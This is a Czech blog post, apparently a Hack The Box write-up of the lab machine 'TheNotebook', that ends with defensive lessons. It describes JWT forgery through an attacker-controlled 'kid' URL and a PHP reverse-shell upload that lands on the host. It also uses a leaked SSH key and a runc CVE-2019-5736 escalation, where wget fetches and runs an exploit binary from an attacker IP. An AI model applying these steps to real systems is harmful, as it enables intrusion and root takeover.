---
layout: post
author: Tomáš Matějíček
title: "TheNotebook"
date: 2021-01-24
tags: linux ssh sudo php exploit enumeration
---
## Úvod a kontext

TheNotebook začíná nenápadnou chybou v práci s JWT. Aplikace sice používá asymetrické podepisování, ale při ověřování slepě důvěřuje adrese v hlavičce `kid` a stáhne si klíč z URL, kterou určí útočník. Tím se z ochrany podpisem stává mechanika, kterou lze plně obejít.

Druhá polovina řetězce je o provozním detailu kolem Dockeru. Upload formulář zapisuje soubory do cesty, která je bind mountnutá z hosta, takže nahraný `rev.php` se neprovede v kontejneru, ale přes nginx přímo na hostitelském systému. Root pak stojí na starém `runc` a právu spouštět `docker exec`.

## Počáteční průzkum

### Vyhledání otevřených portů

Nejdřív mapuji služby a ověřuji, jestli půjde hlavně o webovou aplikaci.

```bash
ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d "/" -f 1 | tr "\n" "," | sed s/,$//);echo $ports;nmap -p $ports -A -sC -sV -v $IP
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http    nginx 1.14.0 (Ubuntu)
```

To ukazuje jednoduchý profil: web jako vstupní bod, SSH až později pro stabilizaci přístupu.

## Analýza zjištění

### JWT s ověřováním podle `kid`

Po registraci a přihlášení aplikace vracela cookie `auth`, která byla JWT tokenem. Dekódování ukazovalo dvě podstatné věci:

- payload obsahuje příznak `admin_cap`,
- hlavička obsahuje `kid`, který ukazuje na URL s klíčem.

Původní token vypadal logicky takto:

```json
{
  "typ": "JWT",
  "alg": "RS256",
  "kid": "http://localhost:7070/privKey.key"
}
```

To je kritická chyba návrhu. Server se nesmí nechat přimět, aby si ověřovací klíč stahoval z útočníkem řízené adresy. Jakmile to dovolí, stačí si vytvořit vlastní pár klíčů, hostovat jej a podepsat libovolný token.

### Vytvoření vlastního admin tokenu

Praktický postup byl přímočarý:

```bash
ssh-keygen -t rsa -b 4096 -m PEM -f privKey.key
python3 -m http.server 8000
```

Pak stačilo změnit hlavičku `kid` na vlastní server a v payloadu nastavit administrátorský příznak:

```json
{
  "username": "ttt",
  "email": "ttt@htb.com",
  "admin_cap": true
}
```

Po podepsání vlastním klíčem a nahrazení cookie se zpřístupnila administrace aplikace.

## Získání přístupu

### Proč upload vede na host a ne do kontejneru

Admin panel obsahoval upload formulář. To samo o sobě ještě neznamená RCE, protože aplikace běžela v Dockeru a bylo potřeba pochopit, kde nahrané soubory končí.

Lokální enumerace později ukázala, že:

- nginx na hostu proxyuje běžné požadavky do kontejneru na `127.0.0.1:8080`,
- ale všechny `.php` soubory obsluhuje lokální PHP-FPM na hostu,
- upload adresář kontejneru je bind mountnutý na `/var/www/html` hosta.

Právě to dělá z uploadu skutečný host-level RCE. Nahraný `rev.php` se uloží do adresáře, který nginx na hostu rovnou interpretuje.

### Shell jako `www-data`

Po nahrání `rev.php` a jeho zavolání vznikl shell jako `www-data`. V tomto kontextu dávalo smysl projít zálohy:

```text
/var/backups/home.tar.gz
```

Archiv obsahoval domácí adresář uživatele `noah`, včetně privátního klíče:

```text
home/noah/.ssh/id_rsa
```

Privátní klíč šel z archivu přečíst a použít přímo pro SSH:

```bash
ssh -i id_rsa noah@10.10.10.230
```

Tím vznikl stabilní přístup pod skutečným uživatelským účtem a bylo možné potvrdit `user.txt`.

## Eskalace oprávnění

### `docker exec` a starý `runc`

Nejdůležitější výstup z `sudo -l` byl:

```text
(ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01*
```

To samo o sobě ještě není automatický root. Rozhodující je verze Dockeru a `runc`. Na hostu běžel Docker 18.06, tedy zranitelný vůči `CVE-2019-5736`.

Princip této chyby je v tom, že proces uvnitř kontejneru dokáže při správném postupu přepsat hostitelský `runc`. Při dalším `docker exec` se pak spustí útočníkův payload na hostu jako root.

### Praktické zneužití

Po sestavení PoC binárky šlo v první relaci vstoupit do kontejneru a exploit spustit:

```bash
sudo /usr/bin/docker exec -it webapp-dev01 /bin/bash
wget http://10.10.14.8:8000/main
chmod +x main
./main
```

Ve druhé relaci pak stačilo vyvolat další `docker exec`, čímž se aktivoval přepsaný `runc` a payload se provedl na hostu jako root. Praktický payload zapisoval vlastní klíč do `/root/.ssh/authorized_keys`, takže následoval už jen SSH login jako root a přečtení `root.txt`.

## Shrnutí klíčových poznatků

- JWT zde selhalo ne kvůli slabému algoritmu, ale kvůli důvěře v útočníkem řízenou hodnotu `kid`.
- Upload formulář získal skutečnou hodnotu až ve chvíli, kdy se ukázalo, že zapisuje do hostem mountnutého adresáře obsluhovaného lokálním PHP.
- User část nevznikla z webu samotného, ale z world-readable zálohy s privátním klíčem uživatele `noah`.
- Root část byla kombinací sudo přístupu k `docker exec` a zranitelného `runc`.

## Co si odnést do praxe

- Server nesmí načítat ověřovací JWT klíče z URL, kterou může ovlivnit klient. `kid` má sloužit k výběru z lokálního trust store, ne jako vzdálený fetch.
- Upload do kontejneru není automaticky bezpečný. Jakmile je cesta bind mountnutá z hosta a na hostu ji zpracovává jiný runtime, může upload obejít hranice kontejneru.
- Zálohy domácích adresářů a SSH klíčů musí být chráněné stejně jako produkční tajemství. World-readable archiv je v praxi okamžitý pivot do další identity.
- `docker exec` pod `sudo` je vysoce privilegované oprávnění. Na starších verzích Dockeru a `runc` může znamenat přímou cestu k rootovi na hostu.
